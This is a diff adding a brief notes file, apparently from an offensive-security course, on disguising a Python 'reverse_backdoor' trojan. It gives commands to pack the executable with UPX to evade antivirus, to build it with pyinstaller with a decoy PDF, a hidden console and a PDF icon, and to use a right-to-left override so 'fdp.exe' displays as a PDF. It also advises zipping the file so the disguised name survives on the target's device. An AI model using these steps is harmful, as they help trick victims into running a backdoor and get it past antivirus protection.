@@ -1,0 +1,34 @@
+To Bypass Antivirus
+
+Download UPX 3.94 latest version for linux
+
+go to the path where upx is installed 
+
+then type this in terminal
+
+./upx /root/..../reverse_backdoor/dist/reverse_backdoor.exe -o compressed_backdoor.exe
+
+
+------------------------------------------------------------------------------
+
+Adding an Icon on a Trojan File 
+
+Go to iconfinder.comm
+search and download the icon 
+
+convert .png to .ico with any website
+
+now in the terminal do
+!wine /root/.wine/drive_c/Python27/Scripts/pyinstaller.exe --add-data "/root/Downloads/sample.pdf;." --onefile --noconsole --icon /root/Downloads/pdf/ico reverse_backdoor.py
+
+To change the extension , use right to left method 
+copy it from kali linux search , and then paste it ,
+it will convert 
+
+fdp.exe -> exe.pdf
+
+then compress it into a zip to protect the files name even when downloaded in target device
+
+
+
+
